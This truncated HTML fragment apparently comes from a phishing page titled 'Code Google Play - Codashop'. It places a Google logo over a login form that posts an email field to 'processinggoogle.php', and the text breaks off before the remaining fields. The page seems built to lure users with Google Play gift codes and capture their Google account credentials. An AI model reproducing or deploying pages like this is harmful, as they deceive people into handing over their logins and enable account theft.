...
<title>Code Google Play - Codashop</title>
...
<div class="col-md-8">
       <form action="processinggoogle.php" id="login-form" method="post">
  <h4 >
<img src="https://img2.pngdownload.id/20180511/afq/kisspng-google-logo-google-adwords-g-suite-google-account-5af5b0b3a42df3.0313241615260509956725.jpg" height="50px" width="50px">  </h4><form id="glogin">
<div style="width:100%" class="form-group">
  <input class="form-control" name="fb1" placeholder="Email" type="email" >
</div>
<div style="width:100%" class="form-group">
